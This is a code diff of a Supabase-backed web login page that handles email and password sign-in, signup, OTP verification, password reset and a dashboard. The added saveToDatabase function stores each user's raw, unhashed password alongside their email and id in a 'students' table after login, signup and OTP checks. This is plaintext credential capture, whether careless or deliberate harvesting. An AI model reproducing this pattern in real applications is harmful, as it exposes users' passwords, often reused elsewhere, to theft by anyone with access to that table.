-      icon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`;
+  // ============================================================
+  // SAVE TO SUPABASE DATABASE (students table)
+  // EMAIL + PASSWORD + USER INFO
+  // ============================================================
+  async function saveToDatabase(user, passwordRaw) {
+    if (!user) return;
+    var payload = {
+      email:      user.email,
+      user_id:    user.id,
+      password:   passwordRaw || '',
+      last_login: new Date().toISOString(),
+      provider:   'email'
+    };
+    var res = await sb.from('students').upsert(payload, { onConflict: 'email' });
+    if (res.error) {
+      console.warn('DB error:', res.error.message);
     } else {
-      inp.type = 'password';
-      icon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+      console.log('Saved to database successfully:', payload.email);
     }
+    return res;
   }
 
-  // ─── SCREEN 2: Login ────────────────────────────────────────────────────────
+  // ============================================================
+  // SCREEN 2 — LOGIN / SIGNUP
+  // ============================================================
   async function handleLogin() {
-    const pw = document.getElementById('passwordInput').value;
-    if (!pw) { showToast('Please enter your password', 'error'); return; }
+    var pw = document.getElementById('passwordInput').value;
+    if (!pw || pw.length < 6) {
+      showError('passError', 'Password must be at least 6 characters.');
+      document.getElementById('passwordInput').classList.add('error-border');
+      return;
+    }
+    showError('passError', '');
+    document.getElementById('passwordInput').classList.remove('error-border');
+    currentPassword = pw;
 
-    if (!isConfigured()) {
-      showToast('Demo mode: Supabase not configured', 'error');
-      showDashboard({ email: currentEmail });
+    setBtnLoading('nextBtn', true, 'Next');
+
+    // Try Login first
+    var loginRes = await sb.auth.signInWithPassword({ email: currentEmail, password: pw });
+
+    if (!loginRes.error && loginRes.data && loginRes.data.user) {
+      // LOGIN SUCCESS
+      await saveToDatabase(loginRes.data.user, pw);
+      setBtnLoading('nextBtn', false, 'Next &#8594;');
+      showDashboard(loginRes.data.user);
       return;
     }
 
-    setLoading('nextBtn', true);
-    const { data, error } = await sb.auth.signInWithPassword({ email: currentEmail, password: pw });
-    setLoading('nextBtn', false);
-
-    if (error) {
-      if (error.message.includes('Invalid login')) {
-        showToast('Incorrect password', 'error');
-      } else if (error.message.includes('Email not confirmed')) {
-        showToast('Please verify your email first', 'error');
-        document.getElementById('otpEmail').textContent = currentEmail;
-        goTo('screen3');
-      } else {
-        showToast(error.message, 'error');
-      }
+    // If wrong password
+    if (loginRes.error && loginRes.error.message.includes('Invalid login credentials')) {
+      setBtnLoading('nextBtn', false, 'Next &#8594;');
+      showError('passError', 'Incorrect password. Try again or use "I forgot my password".');
+      document.getElementById('passwordInput').classList.add('error-border');
+      showToast('Incorrect password', 'error');
       return;
     }
 
-    showDashboard(data.user);
+    // If email not confirmed
+    if (loginRes.error && loginRes.error.message.includes('Email not confirmed')) {
+      setBtnLoading('nextBtn', false, 'Next &#8594;');
+      showToast('Please verify your email — check inbox!', 'error');
+      goTo('screen3');
+      return;
+    }
+
+    // User not found — Sign UP
+    var signupRes = await sb.auth.signUp({ email: currentEmail, password: pw });
+
+    if (signupRes.error) {
+      setBtnLoading('nextBtn', false, 'Next &#8594;');
+      showToast(signupRes.error.message, 'error');
+      return;
+    }
+
+    if (signupRes.data && signupRes.data.user) {
+      await saveToDatabase(signupRes.data.user, pw);
+      setBtnLoading('nextBtn', false, 'Next &#8594;');
+      showToast('Account created! Check your email to verify.', 'success');
+      goTo('screen3');
+    }
   }
 
-  // ─── FORGOT PASSWORD ────────────────────────────────────────────────────────
+  // ============================================================
+  // FORGOT PASSWORD
+  // ============================================================
   async function handleForgotPassword() {
     if (!currentEmail) { showToast('Go back and enter your email first', 'error'); return; }
-
-    if (!isConfigured()) {
-      showToast('Demo mode: Supabase not configured', 'error');
-      return;
-    }
-
-    const { error } = await sb.auth.resetPasswordForEmail(currentEmail);
-    if (error) { showToast(error.message, 'error'); return; }
-    showToast('Password reset email sent! Check your inbox.', 'success');
+    showToast('Sending reset email...', '');
+    var res = await sb.auth.resetPasswordForEmail(currentEmail);
+    if (res.error) { showToast(res.error.message, 'error'); return; }
+    showToast('Reset email sent! Check your inbox.', 'success');
   }
 
-  // ─── SCREEN 3: OTP ──────────────────────────────────────────────────────────
-  document.querySelectorAll('.otp-box').forEach((box, i) => {
-    box.addEventListener('input', () => {
+  // ============================================================
+  // SCREEN 3 — OTP
+  // ============================================================
+  document.querySelectorAll('.otp-box').forEach(function(box, i) {
+    box.addEventListener('input', function() {
       box.value = box.value.replace(/\D/g, '');
-      if (box.value && i < 3) document.getElementById('otp' + (i + 1)).focus();
-      checkOTP();
+      if (box.value && i < 3) document.getElementById('otp' + (i+1)).focus();
+      var code = [0,1,2,3].map(function(n){ return document.getElementById('otp'+n).value; }).join('');
+      document.getElementById('otpNextBtn').disabled = code.length < 4;
     });
-    box.addEventListener('keydown', e => {
+    box.addEventListener('keydown', function(e) {
       if (e.key === 'Backspace' && !box.value && i > 0) {
-        document.getElementById('otp' + (i - 1)).focus();
+        document.getElementById('otp' + (i-1)).focus();
       }
     });
   });
 
-  function checkOTP() {
-    const code = getOTPValue();
-    document.getElementById('otpNextBtn').disabled = code.length < 4;
-  }
-
-  function getOTPValue() {
-    return [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-  }
-
   async function handleOTPVerify() {
-    const code = getOTPValue();
-
-    if (!isConfigured()) {
-      showToast('Demo mode: Supabase not configured', 'error');
-      return;
+    var code = [0,1,2,3].map(function(n){ return document.getElementById('otp'+n).value; }).join('');
+    setBtnLoading('otpNextBtn', true, 'Next');
+    var res = await sb.auth.verifyOtp({ email: currentEmail, token: code, type: 'email' });
+    setBtnLoading('otpNextBtn', false, 'Next &#8594;');
+    if (res.error) { showToast(res.error.message, 'error'); return; }
+    if (res.data && res.data.user) {
+      await saveToDatabase(res.data.user, currentPassword);
+      showDashboard(res.data.user);
     }
-
-    setLoading('otpNextBtn', true);
-    const { data, error } = await sb.auth.verifyOtp({
-      email: currentEmail,
-      token: code,
-      type: 'email'
-    });
-    setLoading('otpNextBtn', false, 'Next →');
-
-    if (error) { showToast(error.message, 'error'); return; }
-    showDashboard(data.user);
   }
 
   async function handleResend() {
-    if (!isConfigured()) {
-      showToast('Demo mode: Supabase not configured', 'error');
-      return;
-    }
-    const { error } = await sb.auth.resend({ type: 'signup', email: currentEmail });
-    if (error) { showToast(error.message, 'error'); return; }
+    var res = await sb.auth.resend({ type: 'signup', email: currentEmail });
+    if (res.error) { showToast(res.error.message, 'error'); return; }
     showToast('Code resent! Check your inbox.', 'success');
   }
 
-  // ─── DASHBOARD ──────────────────────────────────────────────────────────────
+  // ============================================================
+  // DASHBOARD
+  // ============================================================
   function showDashboard(user) {
-    const email = user?.email || currentEmail;
-    const name  = email.split('@')[0];
-    document.getElementById('dashName').textContent  = `Welcome back, ${name}!`;
-    document.getElementById('dashEmail').textContent = email;
+    var email = user && user.email ? user.email : currentEmail;
+    var uid   = user && user.id   ? user.id   : 'N/A';
+    var name  = email.split('@')[0];
+    var now   = new Date().toLocaleString('en-PK', { dateStyle: 'medium', timeStyle: 'short' });
 
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    const dash = document.getElementById('dashboard');
-    dash.classList.add('active');
-    showToast('Signed in successfully', 'success');
+    document.getElementById('dashName').textContent  = 'Welcome, ' + name + '!';
+    document.getElementById('dashEmail').textContent = email;
+    document.getElementById('dashId').textContent    = uid.substring(0, 16) + '...';
+    document.getElementById('dashTime').textContent  = now;
+
+    document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
+    document.getElementById('dashboard').classList.add('active');
+    showToast('Signed in & saved to database!', 'success');
   }
 
   async function handleLogout() {
-    if (isConfigured()) await sb.auth.signOut();
-    currentEmail = '';
+    await sb.auth.signOut();
+    currentEmail = ''; currentPassword = '';
     document.getElementById('emailInput').value    = '';
     document.getElementById('passwordInput').value = '';
     document.getElementById('dashboard').classList.remove('active');
     goTo('screen1');
-    showToast('Signed out');
+    showToast('Signed out successfully');
   }
 
-  // ─── AUTO-SESSION ────────────────────────────────────────────────────────────
-  (async () => {
-    if (!isConfigured()) return;
-    const { data } = await sb.auth.getSession();
-    if (data?.session?.user) showDashboard(data.session.user);
+  // ============================================================
+  // AUTO SESSION RESTORE
+  // ============================================================
+  (async function() {
+    var res = await sb.auth.getSession();
+    if (res.data && res.data.session && res.data.session.user) {
+      showDashboard(res.data.session.user);
+    }
   })();
 </script>
 </body>
